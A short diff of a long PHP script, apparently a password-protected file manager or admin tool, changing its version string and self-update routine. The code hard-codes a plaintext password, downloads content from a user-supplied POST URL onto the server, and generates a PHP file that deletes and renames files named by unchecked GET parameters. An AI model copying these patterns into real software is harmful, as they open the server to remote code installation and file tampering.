@@ -3,7 +3,7 @@ session_start();
 clearstatcache();
 $password = 'mindja!';
 /* SECURITY */
-define('version_script', '0.9.8');
+define('version_script', '0.9.7');
 function get_user_ip() {
 if(isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
 $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_CF_CONNECTING_IP'];
@@ -3640,7 +3640,7 @@ while(file_or_link_exists("update_temp$i.php"))
 $i++;
 $temp_name = "update_temp$i.php";
 if(@file_put_contents($update_name, @file_get_contents(urldecode($_POST['update'])))) {
-if(@file_put_contents($temp_name, '
+if(@file_put_contents($temp_name, '<?' . 'php
 unlink($_GET[\'file\']);
 rename($_GET[\'update\'], $_GET[\'file\']);
 unlink($_GET[\'tmp\']);
